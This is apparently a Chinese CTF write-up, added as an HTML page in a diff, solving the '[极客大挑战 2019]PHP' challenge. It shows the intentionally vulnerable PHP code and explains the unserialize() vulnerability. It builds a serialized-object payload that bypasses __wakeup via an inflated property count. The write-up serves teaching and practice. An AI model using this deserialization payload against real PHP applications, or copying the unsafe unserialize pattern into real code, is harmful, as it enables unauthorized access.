@@ -1,0 +1,84 @@
+<div class="article_content clearfix" id="article_content">
+<link href="style.css" rel="stylesheet"/>
+<div class="htmledit_views" id="content_views">
+<p>有备份的好习惯，扫描目录得到<a href="http://www.zip/" title="www.zip">www.zip</a></p>
+<p>几个重要php文件内容：</p>
+<p><strong>index.php</strong></p>
+<pre><code class="language-php">1 &lt;?php
+2     include ‘class.php‘;
+3     $select = $_GET[‘select‘];
+4     $res=unserialize(@$select);
+5 ?&gt;</code></pre>
+<p>代码第4行unserialize可能存在反序列化漏洞</p>
+<p><strong>class.php</strong></p>
+<pre><code class="language-php"> 1 &lt;?php
+ 2 include ‘flag.php‘;
+ 3 error_reporting(0);
+ 4 class Name{
+ 5     private $username = ‘nonono‘;
+ 6     private $password = ‘yesyes‘;
+ 7 
+ 8     public function __construct($username,$password){
+ 9         $this-&gt;username = $username;
+10         $this-&gt;password = $password;
+11     }
+12 
+13     function __wakeup(){
+14         $this-&gt;username = ‘guest‘;
+15     }
+16 
+17     function __destruct(){
+18         if ($this-&gt;password != 100) {
+19             echo "&lt;/br&gt;NO!!!hacker!!!&lt;/br&gt;";
+20             echo "You name is: ";
+21             echo $this-&gt;username;echo "&lt;/br&gt;";
+22             echo "You password is: ";
+23             echo $this-&gt;password;echo "&lt;/br&gt;";
+24             die();
+25         }
+26         if ($this-&gt;username === ‘admin‘) {
+27             global $flag;
+28             echo $flag;
+29         }else{
+30             echo "&lt;/br&gt;hello my friend~~&lt;/br&gt;sorry i can‘t give you the flag!";
+31             die();   
+32         }
+33     }
+34 }
+35 ?&gt;</code></pre>
+<p>代码第26行如果username为admin便输出flag，从__destruct，__construct，__wakeup可以判断存在<u><strong>反序列化漏洞</strong></u></p>
+<h3>php序列化与反序列化</h3>
+<p>序列化：函数为serialize()，把复杂的数据类型压缩到一个字符串中 数据类型可以是数组，字符串，对象等<br/> 反序列化：函数为unserialize()，将字符串转换成变量或对象的过程<br/> 常用的内置方法：<br/> __construct()：创建对象时初始化，当一个对象创建时被调用<br/> __wakeup() 使用unserialize时触发<br/> __sleep() 使用serialize时触发<br/> __destruction()：结束时销毁对象，当一个对象销毁时被调用</p>
+<p></p>
+<p>我们需要将Name类序列化的结果输出</p>
+<pre><code class="language-php">&lt;?php
+
+class Name{
+    private $username = ‘nonono‘;
+    private $password = ‘yesyes‘;
+
+    public function __construct($username,$password){
+        $this-&gt;username = $username;
+        $this-&gt;password = $password;
+    }
+}
+$a = new Name(‘admin‘,100);
+$b = serialize($a);
+echo $b;</code></pre>
+<p>输出结果为：</p>
+<pre><code class="language-php">O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}</code></pre>
+<p>输出结果中Name和username，Name和password之间是有不可见字符的，因为private 声明的字段为私有字段，只在所声明的类中可见，在该类的子类和该类的对象实例中均不可见。因此私有字段的字段名在序列化时，类名和字段名前面都会加上ascii为0的字符（不可见字符）</p>
+<p><strong>另外我们还需要绕过__wakeup方法</strong></p>
+<p>在反序列化字符串时，属性个数的值大于实际属性个数时，会<strong>跳过 __wakeup()函数</strong>的执行<br/> 原本：O:4:"Name":2:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}<br/> 绕过：O:4:"Name":3:{s:14:"Nameusername";s:5:"admin";s:14:"Namepassword";i:100;}</p>
+<p>所以payload为：</p>
+<pre><code class="language-php">?select=O:4:%22Name%22:3:{s:14:%22%00Name%00username%22;s:5:%22admin%22;s:14:%22%00Name%00password%22;i:100;}</code></pre>
+<p>另外，在脚本输出的时候后可以进行URL编码再输出：</p>
+<p><img alt="" height="618" src="image\33bab23a58184070a924e098168175b0.png" width="814"/></p>
+<p> <img alt="" height="371" src="image\92f4bac098154c98b903bf4338848401.png" width="1200"/></p>
+<p> 这样结果自动帮我们加入的private的%00，</p>
+<p>但是注意记得将‘2’ 改为‘3’进行绕过<strong>__wakeup()函数！！！</strong></p>
+<p></p>
+<p>参考大佬链接：</p>
+<p><br/><a href="http://www.mamicode.com/info-detail-3049523.html" title="[极客大挑战 2019]PHP"><br/> [极客大挑战 2019]PHP</a></p>
+</div>
+</div>
